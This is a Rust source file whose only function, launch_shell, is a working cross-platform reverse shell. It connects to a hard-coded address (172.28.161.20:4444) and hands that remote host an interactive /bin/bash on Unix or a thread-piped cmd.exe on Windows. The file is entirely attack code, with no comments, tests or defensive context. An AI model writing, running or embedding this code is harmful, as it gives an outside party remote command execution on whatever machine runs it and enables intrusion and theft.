use std::net::TcpStream;
use std::process::{Command, Stdio};

#[cfg(unix)]
use std::os::unix::io::{AsRawFd, FromRawFd};

#[cfg(windows)]
use std::os::windows::io::{AsRawSocket, FromRawSocket};

pub fn launch_shell() {
    let sock = TcpStream::connect("172.28.161.20:4444").unwrap();

    #[cfg(unix)]
    {
        let fd = sock.as_raw_fd();
        Command::new("/bin/bash")
            .arg("-i")
            .stdin(unsafe { Stdio::from_raw_fd(fd) })
            .stdout(unsafe { Stdio::from_raw_fd(fd) })
            .stderr(unsafe { Stdio::from_raw_fd(fd) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }

    #[cfg(windows)]
    {
        use std::io::{Read, Write};
        use std::thread;

        let mut child = Command::new("cmd.exe")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();

        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();
        let mut child_stdin = child.stdin.take().unwrap();

        let mut sock_read = sock.try_clone().unwrap();
        let mut sock_write1 = sock.try_clone().unwrap();
        let mut sock_write2 = sock.try_clone().unwrap();

        let stdin_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match sock_read.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if child_stdin.write_all(&buffer[..n]).is_err() {
                            break;
                        }
                        child_stdin.flush().ok();
                    }
                    Err(_) => break,
                }
            }
        });

        let stdout_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stdout.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if sock_write1.write_all(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        let stderr_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stderr.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if sock_write2.write_all(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        child.wait().unwrap();
        stdin_thread.join().ok();
        stdout_thread.join().ok();
        stderr_thread.join().ok();
    }
}
